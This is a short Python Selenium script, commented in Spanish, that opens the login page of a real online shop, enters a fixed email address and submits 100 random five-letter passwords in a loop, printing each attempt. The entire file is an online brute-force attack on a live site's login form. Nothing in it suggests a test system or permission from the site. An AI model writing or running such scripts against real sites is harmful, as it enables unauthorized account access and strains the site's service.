from selenium import webdriver
from selenium.webdriver.common.keys import Keys
import random
import string

driver = webdriver.Chrome()
letras = string.ascii_lowercase
driver.get("https://www.todobajos.com/es/iniciar-sesion")
user = driver.find_element_by_css_selector("div.form-group:nth-child(2) > div:nth-child(2) > input:nth-child(1)")
user.clear()
user.send_keys("reseso6861@soulsuns.com")

for i in range(0,100):
    password = driver.find_element_by_css_selector(".js-visible-password")
    password.clear()
    clave = ''.join(random.choice(letras) for i in range(5))
    password.send_keys(clave)
    button = driver.find_element_by_xpath("//*[@id='SubmitLogin']")
    driver.execute_script("arguments[0].click();", button)
    print("Intento ",i+1," Contraseña: ", clave)
